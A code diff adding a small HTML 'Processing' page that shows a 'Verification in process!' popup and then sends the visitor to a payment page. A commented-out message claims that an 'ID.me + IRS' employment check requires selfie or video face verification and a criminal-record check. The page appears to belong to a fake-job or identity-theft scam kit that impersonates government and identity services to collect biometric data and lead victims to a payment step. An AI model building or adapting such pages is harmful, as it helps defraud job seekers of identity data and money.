@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Processing</title>
+  </head>
+  <body>
+    <style>
+      .swal-footer {
+        text-align: center !important;
+      }
+      .swal-button-container {
+        float: none !important;
+      }
+      .swal-button {
+        background-color: green;
+      }
+    </style>
+
+    <style>
+      .swal-footer {
+        overflow: auto;
+      }
+
+      .swal-button-container {
+        float: right;
+      }
+    </style>
+    <!--  THIS ONE IS FOR swal -->
+    <!-- <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script> -->
+
+    <!--  THIS ONE IS FOR Swal.fire -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+      // Swal.fire({
+      //   title: "Verification in process!",
+      //   text: "Our company verification process is being programmed by ID.me + IRS because of the benefit you get from the company when you are fully employed and also for credit check history therefore, a link will be sent to your mobile number for selfie or video verification to compare with the form submitted and make sure there is no criminal record related with the IRS. Make sure the camera scans your face clearly and no light reflection.",
+      //   icon: "success",
+      //   button: "OKAY",
+      // }).then(function () {
+      //   window.location = "../payment/index.html";
+      // });
+
+      Swal.fire({
+        title: "Verification in process!",
+        text: "Your request is being reviewed and you should recieve an email reply within 48 hours",
+        icon: "success",
+        button: "OKAY",
+      }).then(function () {
+        window.location = "../payment/index.html";
+      });
+    </script>
+  </body>
+</html>
